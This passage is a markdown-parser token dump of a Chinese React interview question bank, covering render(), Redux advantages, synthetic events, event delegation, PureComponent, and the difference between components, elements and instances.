类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 每个React组件强制要求必须有一个 render()。它返回一个 React 元素，是原生 DOM 组件的表示。如果需要渲染多个 HTML 元素，则必须将它们组合在一个封闭标记内，此函数必须保持纯净，即必须每次调用时都返回相同的结果。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 每个React组件强制要求必须有一个 render()。它返回一个 React 元素，是原生 DOM 组件的表示。如果需要渲染多个 HTML 元素，则必须将它们组合在一个封闭标记内，此函数必须保持纯净，即必须每次调用时都返回相同的结果。","task":false,"loose":false,"text":"每个React组件强制要求必须有一个 render()。它返回一个 React 元素，是原生 DOM 组件的表示。如果需要渲染多个 HTML 元素，则必须将它们组合在一个封闭标记内，此函数必须保持纯净，即必须每次调用时都返回相同的结果。","tokens":[{"type":"text","raw":"每个React组件强制要求必须有一个 render()。它返回一个 React 元素，是原生 DOM 组件的表示。如果需要渲染多个 HTML 元素，则必须将它们组合在一个封闭标记内，此函数必须保持纯净，即必须每次调用时都返回相同的结果。","text":"每个React组件强制要求必须有一个 render()。它返回一个 React 元素，是原生 DOM 组件的表示。如果需要渲染多个 HTML 元素，则必须将它们组合在一个封闭标记内，此函数必须保持纯净，即必须每次调用时都返回相同的结果。","tokens":[{"type":"text","raw":"每个React组件强制要求必须有一个 render()。它返回一个 React 元素，是原生 DOM 组件的表示。如果需要渲染多个 HTML 元素，则必须将它们组合在一个封闭标记内，此函数必须保持纯净，即必须每次调用时都返回相同的结果。","text":"每个React组件强制要求必须有一个 render()。它返回一个 React 元素，是原生 DOM 组件的表示。如果需要渲染多个 HTML 元素，则必须将它们组合在一个封闭标记内，此函数必须保持纯净，即必须每次调用时都返回相同的结果。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 35. Redux 有哪些优点？\\n\\n","depth":2,"text":"35. Redux 有哪些优点？","tokens":[{"type":"text","raw":"35. Redux 有哪些优点？","text":"35. Redux 有哪些优点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 结果的可预测性 - 由于总是存在一个真实来源，即 store ，因此不存在如何将当前状态与动作和应用的其他部分同步的问题。\\n\\n- 可维护性 - 由于没有直接接触 DOM，React 组件更容易进行单元测试和重用。\\n\\n- 服务端渲染 - 你只需渲染应用一次，然后将结果发送到客户端。这对于 SEO 和快速首次渲染非常重要。\\n\\n- 开发人员工具 - 从组件层次结构、当前状态和派生数据（如路由）到与时间旅行和编辑动作相关的任何内容，您都可以立即访问。\\n\\n- 社区和生态系统 - React 拥有非常庞大且快速增长的生态系统，大量可重用的库和组件都可用于 React。\\n\\n- 易于测试 - 由于应用的状态保存在 store 中，并且不直接与浏览器 DOM 交互，因此您的测试将更易于预测和复制。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 结果的可预测性 - 由于总是存在一个真实来源，即 store ，因此不存在如何将当前状态与动作和应用的其他部分同步的问题。\\n\\n","task":false,"loose":true,"text":"结果的可预测性 - 由于总是存在一个真实来源，即 store ，因此不存在如何将当前状态与动作和应用的其他部分同步的问题。\\n","tokens":[{"type":"text","raw":"结果的可预测性 - 由于总是存在一个真实来源，即 store ，因此不存在如何将当前状态与动作和应用的其他部分同步的问题。\\n","text":"结果的可预测性 - 由于总是存在一个真实来源，即 store ，因此不存在如何将当前状态与动作和应用的其他部分同步的问题。","tokens":[{"type":"text","raw":"结果的可预测性 - 由于总是存在一个真实来源，即 store ，因此不存在如何将当前状态与动作和应用的其他部分同步的问题。","text":"结果的可预测性 - 由于总是存在一个真实来源，即 store ，因此不存在如何将当前状态与动作和应用的其他部分同步的问题。","escaped":false}]}]},{"type":"list_item","raw":"- 可维护性 - 由于没有直接接触 DOM，React 组件更容易进行单元测试和重用。\\n\\n","task":false,"loose":true,"text":"可维护性 - 由于没有直接接触 DOM，React 组件更容易进行单元测试和重用。\\n","tokens":[{"type":"text","raw":"可维护性 - 由于没有直接接触 DOM，React 组件更容易进行单元测试和重用。\\n","text":"可维护性 - 由于没有直接接触 DOM，React 组件更容易进行单元测试和重用。","tokens":[{"type":"text","raw":"可维护性 - 由于没有直接接触 DOM，React 组件更容易进行单元测试和重用。","text":"可维护性 - 由于没有直接接触 DOM，React 组件更容易进行单元测试和重用。","escaped":false}]}]},{"type":"list_item","raw":"- 服务端渲染 - 你只需渲染应用一次，然后将结果发送到客户端。这对于 SEO 和快速首次渲染非常重要。\\n\\n","task":false,"loose":true,"text":"服务端渲染 - 你只需渲染应用一次，然后将结果发送到客户端。这对于 SEO 和快速首次渲染非常重要。\\n","tokens":[{"type":"text","raw":"服务端渲染 - 你只需渲染应用一次，然后将结果发送到客户端。这对于 SEO 和快速首次渲染非常重要。\\n","text":"服务端渲染 - 你只需渲染应用一次，然后将结果发送到客户端。这对于 SEO 和快速首次渲染非常重要。","tokens":[{"type":"text","raw":"服务端渲染 - 你只需渲染应用一次，然后将结果发送到客户端。这对于 SEO 和快速首次渲染非常重要。","text":"服务端渲染 - 你只需渲染应用一次，然后将结果发送到客户端。这对于 SEO 和快速首次渲染非常重要。","escaped":false}]}]},{"type":"list_item","raw":"- 开发人员工具 - 从组件层次结构、当前状态和派生数据（如路由）到与时间旅行和编辑动作相关的任何内容，您都可以立即访问。\\n\\n","task":false,"loose":true,"text":"开发人员工具 - 从组件层次结构、当前状态和派生数据（如路由）到与时间旅行和编辑动作相关的任何内容，您都可以立即访问。\\n","tokens":[{"type":"text","raw":"开发人员工具 - 从组件层次结构、当前状态和派生数据（如路由）到与时间旅行和编辑动作相关的任何内容，您都可以立即访问。\\n","text":"开发人员工具 - 从组件层次结构、当前状态和派生数据（如路由）到与时间旅行和编辑动作相关的任何内容，您都可以立即访问。","tokens":[{"type":"text","raw":"开发人员工具 - 从组件层次结构、当前状态和派生数据（如路由）到与时间旅行和编辑动作相关的任何内容，您都可以立即访问。","text":"开发人员工具 - 从组件层次结构、当前状态和派生数据（如路由）到与时间旅行和编辑动作相关的任何内容，您都可以立即访问。","escaped":false}]}]},{"type":"list_item","raw":"- 社区和生态系统 - React 拥有非常庞大且快速增长的生态系统，大量可重用的库和组件都可用于 React。\\n\\n","task":false,"loose":true,"text":"社区和生态系统 - React 拥有非常庞大且快速增长的生态系统，大量可重用的库和组件都可用于 React。\\n","tokens":[{"type":"text","raw":"社区和生态系统 - React 拥有非常庞大且快速增长的生态系统，大量可重用的库和组件都可用于 React。\\n","text":"社区和生态系统 - React 拥有非常庞大且快速增长的生态系统，大量可重用的库和组件都可用于 React。","tokens":[{"type":"text","raw":"社区和生态系统 - React 拥有非常庞大且快速增长的生态系统，大量可重用的库和组件都可用于 React。","text":"社区和生态系统 - React 拥有非常庞大且快速增长的生态系统，大量可重用的库和组件都可用于 React。","escaped":false}]}]},{"type":"list_item","raw":"- 易于测试 - 由于应用的状态保存在 store 中，并且不直接与浏览器 DOM 交互，因此您的测试将更易于预测和复制。","task":false,"loose":true,"text":"易于测试 - 由于应用的状态保存在 store 中，并且不直接与浏览器 DOM 交互，因此您的测试将更易于预测和复制。","tokens":[{"type":"text","raw":"易于测试 - 由于应用的状态保存在 store 中，并且不直接与浏览器 DOM 交互，因此您的测试将更易于预测和复制。","text":"易于测试 - 由于应用的状态保存在 store 中，并且不直接与浏览器 DOM 交互，因此您的测试将更易于预测和复制。","tokens":[{"type":"text","raw":"易于测试 - 由于应用的状态保存在 store 中，并且不直接与浏览器 DOM 交互，因此您的测试将更易于预测和复制。","text":"易于测试 - 由于应用的状态保存在 store 中，并且不直接与浏览器 DOM 交互，因此您的测试将更易于预测和复制。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 36. React的事件和普通的HTML事件有什么不同？\\n\\n","depth":2,"text":"36. React的事件和普通的HTML事件有什么不同？","tokens":[{"type":"text","raw":"36. React的事件和普通的HTML事件有什么不同？","text":"36. React的事件和普通的HTML事件有什么不同？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"区别：","text":"区别：","tokens":[{"type":"text","raw":"区别：","text":"区别：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 对于事件名称命名方式，原生事件为全小写，react 事件采用小驼峰；\\n\\n- 对于事件函数处理语法，原生事件为字符串，react 事件为函数；\\n\\n- react 事件不能采用 return false 的方式来阻止浏览器的默认行为，而必须要地明确地调用preventDefault()来阻止默认行为。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 对于事件名称命名方式，原生事件为全小写，react 事件采用小驼峰；\\n\\n","task":false,"loose":true,"text":"对于事件名称命名方式，原生事件为全小写，react 事件采用小驼峰；\\n","tokens":[{"type":"text","raw":"对于事件名称命名方式，原生事件为全小写，react 事件采用小驼峰；\\n","text":"对于事件名称命名方式，原生事件为全小写，react 事件采用小驼峰；","tokens":[{"type":"text","raw":"对于事件名称命名方式，原生事件为全小写，react 事件采用小驼峰；","text":"对于事件名称命名方式，原生事件为全小写，react 事件采用小驼峰；","escaped":false}]}]},{"type":"list_item","raw":"- 对于事件函数处理语法，原生事件为字符串，react 事件为函数；\\n\\n","task":false,"loose":true,"text":"对于事件函数处理语法，原生事件为字符串，react 事件为函数；\\n","tokens":[{"type":"text","raw":"对于事件函数处理语法，原生事件为字符串，react 事件为函数；\\n","text":"对于事件函数处理语法，原生事件为字符串，react 事件为函数；","tokens":[{"type":"text","raw":"对于事件函数处理语法，原生事件为字符串，react 事件为函数；","text":"对于事件函数处理语法，原生事件为字符串，react 事件为函数；","escaped":false}]}]},{"type":"list_item","raw":"- react 事件不能采用 return false 的方式来阻止浏览器的默认行为，而必须要地明确地调用preventDefault()来阻止默认行为。","task":false,"loose":true,"text":"react 事件不能采用 return false 的方式来阻止浏览器的默认行为，而必须要地明确地调用preventDefault()来阻止默认行为。","tokens":[{"type":"text","raw":"react 事件不能采用 return false 的方式来阻止浏览器的默认行为，而必须要地明确地调用preventDefault()来阻止默认行为。","text":"react 事件不能采用 return false 的方式来阻止浏览器的默认行为，而必须要地明确地调用preventDefault()来阻止默认行为。","tokens":[{"type":"text","raw":"react 事件不能采用 return false 的方式来阻止浏览器的默认行为，而必须要地明确地调用preventDefault()来阻止默认行为。","text":"react 事件不能采用 return false 的方式来阻止浏览器的默认行为，而必须要地明确地调用preventDefault()来阻止默认行为。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"合成事件是 react 模拟原生 DOM 事件所有能力的一个事件对象，其优点如下：","text":"合成事件是 react 模拟原生 DOM 事件所有能力的一个事件对象，其优点如下：","tokens":[{"type":"text","raw":"合成事件是 react 模拟原生 DOM 事件所有能力的一个事件对象，其优点如下：","text":"合成事件是 react 模拟原生 DOM 事件所有能力的一个事件对象，其优点如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 兼容所有浏览器，更好的跨平台；\\n\\n- 将事件统一存放在一个数组，避免频繁的新增与删除（垃圾回收）。\\n\\n- 方便 react 统一管理和事务机制。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 兼容所有浏览器，更好的跨平台；\\n\\n","task":false,"loose":true,"text":"兼容所有浏览器，更好的跨平台；\\n","tokens":[{"type":"text","raw":"兼容所有浏览器，更好的跨平台；\\n","text":"兼容所有浏览器，更好的跨平台；","tokens":[{"type":"text","raw":"兼容所有浏览器，更好的跨平台；","text":"兼容所有浏览器，更好的跨平台；","escaped":false}]}]},{"type":"list_item","raw":"- 将事件统一存放在一个数组，避免频繁的新增与删除（垃圾回收）。\\n\\n","task":false,"loose":true,"text":"将事件统一存放在一个数组，避免频繁的新增与删除（垃圾回收）。\\n","tokens":[{"type":"text","raw":"将事件统一存放在一个数组，避免频繁的新增与删除（垃圾回收）。\\n","text":"将事件统一存放在一个数组，避免频繁的新增与删除（垃圾回收）。","tokens":[{"type":"text","raw":"将事件统一存放在一个数组，避免频繁的新增与删除（垃圾回收）。","text":"将事件统一存放在一个数组，避免频繁的新增与删除（垃圾回收）。","escaped":false}]}]},{"type":"list_item","raw":"- 方便 react 统一管理和事务机制。","task":false,"loose":true,"text":"方便 react 统一管理和事务机制。","tokens":[{"type":"text","raw":"方便 react 统一管理和事务机制。","text":"方便 react 统一管理和事务机制。","tokens":[{"type":"text","raw":"方便 react 统一管理和事务机制。","text":"方便 react 统一管理和事务机制。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"事件的执行顺序为原生事件先执行，合成事件后执行，合成事件会冒泡绑定到 document 上，所以尽量避免原生事件与合成事件混用，如果原生事件阻止冒泡，可能会导致合成事件不执行，因为需要冒泡到document 上合成事件才会执行。","text":"事件的执行顺序为原生事件先执行，合成事件后执行，合成事件会冒泡绑定到 document 上，所以尽量避免原生事件与合成事件混用，如果原生事件阻止冒泡，可能会导致合成事件不执行，因为需要冒泡到document 上合成事件才会执行。","tokens":[{"type":"text","raw":"事件的执行顺序为原生事件先执行，合成事件后执行，合成事件会冒泡绑定到 document 上，所以尽量避免原生事件与合成事件混用，如果原生事件阻止冒泡，可能会导致合成事件不执行，因为需要冒泡到document 上合成事件才会执行。","text":"事件的执行顺序为原生事件先执行，合成事件后执行，合成事件会冒泡绑定到 document 上，所以尽量避免原生事件与合成事件混用，如果原生事件阻止冒泡，可能会导致合成事件不执行，因为需要冒泡到document 上合成事件才会执行。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 37. React 组件中怎么做事件代理？它的原理是什么？\\n\\n","depth":2,"text":"37. React 组件中怎么做事件代理？它的原理是什么？","tokens":[{"type":"text","raw":"37. React 组件中怎么做事件代理？它的原理是什么？","text":"37. React 组件中怎么做事件代理？它的原理是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"区别：","text":"区别：","tokens":[{"type":"text","raw":"区别：","text":"区别：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"React基于Virtual DOM实现了一个SyntheticEvent层（合成事件层），定义的事件处理器会接收到一个合成事件对象的实例，它符合W3C标准，且与原生的浏览器事件拥有同样的接口，支持冒泡机制，所有的事件都自动绑定在最外层上。","text":"React基于Virtual DOM实现了一个SyntheticEvent层（合成事件层），定义的事件处理器会接收到一个合成事件对象的实例，它符合W3C标准，且与原生的浏览器事件拥有同样的接口，支持冒泡机制，所有的事件都自动绑定在最外层上。","tokens":[{"type":"text","raw":"React基于Virtual DOM实现了一个SyntheticEvent层（合成事件层），定义的事件处理器会接收到一个合成事件对象的实例，它符合W3C标准，且与原生的浏览器事件拥有同样的接口，支持冒泡机制，所有的事件都自动绑定在最外层上。","text":"React基于Virtual DOM实现了一个SyntheticEvent层（合成事件层），定义的事件处理器会接收到一个合成事件对象的实例，它符合W3C标准，且与原生的浏览器事件拥有同样的接口，支持冒泡机制，所有的事件都自动绑定在最外层上。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在React底层，主要对合成事件做了两件事：","text":"在React底层，主要对合成事件做了两件事：","tokens":[{"type":"text","raw":"在React底层，主要对合成事件做了两件事：","text":"在React底层，主要对合成事件做了两件事：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 事件委派： React会把所有的事件绑定到结构的最外层，使用统一的事件监听器，这个事件监听器上维持了一个映射来保存所有组件内部事件监听和处理函数。\\n\\n- 自动绑定： React组件中，每个方法的上下文都会指向该组件的实例，即自动绑定this为当前组件。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 事件委派： React会把所有的事件绑定到结构的最外层，使用统一的事件监听器，这个事件监听器上维持了一个映射来保存所有组件内部事件监听和处理函数。\\n\\n","task":false,"loose":true,"text":"事件委派： React会把所有的事件绑定到结构的最外层，使用统一的事件监听器，这个事件监听器上维持了一个映射来保存所有组件内部事件监听和处理函数。\\n","tokens":[{"type":"text","raw":"事件委派： React会把所有的事件绑定到结构的最外层，使用统一的事件监听器，这个事件监听器上维持了一个映射来保存所有组件内部事件监听和处理函数。\\n","text":"事件委派： React会把所有的事件绑定到结构的最外层，使用统一的事件监听器，这个事件监听器上维持了一个映射来保存所有组件内部事件监听和处理函数。","tokens":[{"type":"text","raw":"事件委派： React会把所有的事件绑定到结构的最外层，使用统一的事件监听器，这个事件监听器上维持了一个映射来保存所有组件内部事件监听和处理函数。","text":"事件委派： React会把所有的事件绑定到结构的最外层，使用统一的事件监听器，这个事件监听器上维持了一个映射来保存所有组件内部事件监听和处理函数。","escaped":false}]}]},{"type":"list_item","raw":"- 自动绑定： React组件中，每个方法的上下文都会指向该组件的实例，即自动绑定this为当前组件。","task":false,"loose":true,"text":"自动绑定： React组件中，每个方法的上下文都会指向该组件的实例，即自动绑定this为当前组件。","tokens":[{"type":"text","raw":"自动绑定： React组件中，每个方法的上下文都会指向该组件的实例，即自动绑定this为当前组件。","text":"自动绑定： React组件中，每个方法的上下文都会指向该组件的实例，即自动绑定this为当前组件。","tokens":[{"type":"text","raw":"自动绑定： React组件中，每个方法的上下文都会指向该组件的实例，即自动绑定this为当前组件。","text":"自动绑定： React组件中，每个方法的上下文都会指向该组件的实例，即自动绑定this为当前组件。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 38. React.Component 和 React.PureComponent 的区别\\n\\n","depth":2,"text":"38. React.Component 和 React.PureComponent 的区别","tokens":[{"type":"text","raw":"38. React.Component 和 React.PureComponent 的区别","text":"38. React.Component 和 React.PureComponent 的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"区别：","text":"区别：","tokens":[{"type":"text","raw":"区别：","text":"区别：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"PureComponent表示一个纯组件，可以用来优化React程序，减少render函数执行的次数，从而提高组件的性能。：","text":"PureComponent表示一个纯组件，可以用来优化React程序，减少render函数执行的次数，从而提高组件的性能。：","tokens":[{"type":"text","raw":"PureComponent表示一个纯组件，可以用来优化React程序，减少render函数执行的次数，从而提高组件的性能。：","text":"PureComponent表示一个纯组件，可以用来优化React程序，减少render函数执行的次数，从而提高组件的性能。：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在React中，当prop或者state发生变化时，可以通过在shouldComponentUpdate生命周期函数中执行return false来阻止页面的更新，从而减少不必要的render执行。React.PureComponent会自动执行 shouldComponentUpdate。","text":"在React中，当prop或者state发生变化时，可以通过在shouldComponentUpdate生命周期函数中执行return false来阻止页面的更新，从而减少不必要的render执行。React.PureComponent会自动执行 shouldComponentUpdate。","tokens":[{"type":"text","raw":"在React中，当prop或者state发生变化时，可以通过在shouldComponentUpdate生命周期函数中执行return false来阻止页面的更新，从而减少不必要的render执行。React.PureComponent会自动执行 shouldComponentUpdate。","text":"在React中，当prop或者state发生变化时，可以通过在shouldComponentUpdate生命周期函数中执行return false来阻止页面的更新，从而减少不必要的render执行。React.PureComponent会自动执行 shouldComponentUpdate。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"不过，pureComponent中的 shouldComponentUpdate() 进行的是浅比较，也就是说如果是引用数据类型的数据，只会比较不是同一个地址，而不会比较这个地址里面的数据是否一致。浅比较会忽略属性和或状态突变情况，其实也就是数据引用指针没有变化，而数据发生改变的时候render是不会执行的。如果需要重新渲染那么就需要重新开辟空间引用数据。PureComponent一般会用在一些纯展示组件上。","text":"不过，pureComponent中的 shouldComponentUpdate() 进行的是浅比较，也就是说如果是引用数据类型的数据，只会比较不是同一个地址，而不会比较这个地址里面的数据是否一致。浅比较会忽略属性和或状态突变情况，其实也就是数据引用指针没有变化，而数据发生改变的时候render是不会执行的。如果需要重新渲染那么就需要重新开辟空间引用数据。PureComponent一般会用在一些纯展示组件上。","tokens":[{"type":"text","raw":"不过，pureComponent中的 shouldComponentUpdate() 进行的是浅比较，也就是说如果是引用数据类型的数据，只会比较不是同一个地址，而不会比较这个地址里面的数据是否一致。浅比较会忽略属性和或状态突变情况，其实也就是数据引用指针没有变化，而数据发生改变的时候render是不会执行的。如果需要重新渲染那么就需要重新开辟空间引用数据。PureComponent一般会用在一些纯展示组件上。","text":"不过，pureComponent中的 shouldComponentUpdate() 进行的是浅比较，也就是说如果是引用数据类型的数据，只会比较不是同一个地址，而不会比较这个地址里面的数据是否一致。浅比较会忽略属性和或状态突变情况，其实也就是数据引用指针没有变化，而数据发生改变的时候render是不会执行的。如果需要重新渲染那么就需要重新开辟空间引用数据。PureComponent一般会用在一些纯展示组件上。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用pureComponent的好处：当组件更新时，如果组件的props或者state都没有改变，render函数就不会触发。省去虚拟DOM的生成和对比过程，达到提升性能的目的。这是因为react自动做了一层浅比较。","text":"使用pureComponent的好处：当组件更新时，如果组件的props或者state都没有改变，render函数就不会触发。省去虚拟DOM的生成和对比过程，达到提升性能的目的。这是因为react自动做了一层浅比较。","tokens":[{"type":"text","raw":"使用pureComponent的好处：当组件更新时，如果组件的props或者state都没有改变，render函数就不会触发。省去虚拟DOM的生成和对比过程，达到提升性能的目的。这是因为react自动做了一层浅比较。","text":"使用pureComponent的好处：当组件更新时，如果组件的props或者state都没有改变，render函数就不会触发。省去虚拟DOM的生成和对比过程，达到提升性能的目的。这是因为react自动做了一层浅比较。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 39. Component, Element, Instance 之间有什么区别和联系？\\n\\n","depth":2,"text":"39. Component, Element, Instance 之间有什么区别和联系？","tokens":[{"type":"text","raw":"39. Component, Element, Instance 之间有什么区别和联系？","text":"39. Component, Element, Instance 之间有什么区别和联系？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 元素： 一个元素element是一个普通对象(plain object)，描述了对于一个DOM节点或者其他组件component，你想让它在屏幕上呈现成什么样子。元素element可以在它的属性props中包含其他元素(译注:用于形成元素树)。创建一个React元素element成本很低。元素element创建之后是不可变的。\\n\\n- 组件： 一个组件component可以通过多种方式声明。可以是带有一个render()方法的类，简单点也可以定义为一个函数。这两种情况下，它都把属性props作为输入，把返回的一棵元素树作为输出。\\n\\n- 实例： 一个实例instance是你在所写的组件类component class中使用关键字this所指向的东西(译注:组件实例)。它用来存储本地状态和响应生命周期事件很有用。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 元素： 一个元素element是一个普通对象(plain object)，描述了对于一个DOM节点或者其他组件component，你想让它在屏幕上呈现成什么样子。元素element可以在它的属性props中包含其他元素(译注:用于形成元素树)。创建一个React元素element成本很低。元素element创建之后是不可变的。\\n\\n","task":false,"loose":true,"text":"元素： 一个元素element是一个普通对象(plain 